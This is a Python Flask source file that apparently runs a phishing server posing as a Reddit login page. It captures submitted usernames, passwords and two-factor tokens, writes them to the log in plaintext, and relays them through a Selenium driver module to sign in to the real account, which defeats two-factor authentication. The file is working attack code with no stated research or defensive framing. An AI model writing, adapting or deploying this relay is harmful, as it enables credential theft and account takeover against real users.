import logging
import sys
import json

from flask import (Flask, render_template, redirect, url_for, request, jsonify)

import selenium_driver as sd

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('reddit.html')

@app.route('/login', methods=['POST'])
def login():
    data = json.loads(request.data)
    user = data['username']
    pswd = data['password']

    app.logger.info('{} : {}'.format(user, pswd))

    sd.do_login(Username=user, Password=pswd)

    return jsonify({'valid': True, '2fa': True})

@app.route('/token', methods=['POST'])
def twofa():
    data = json.loads(request.data)
    tok = data['token']

    app.logger.info('{}'.format(tok))

    sd.do_twoauth(tok)

    return jsonify({'valid': True})

if __name__ == '__main__':
    app.before_first_request(sd.setup)
    app.run(debug=True)
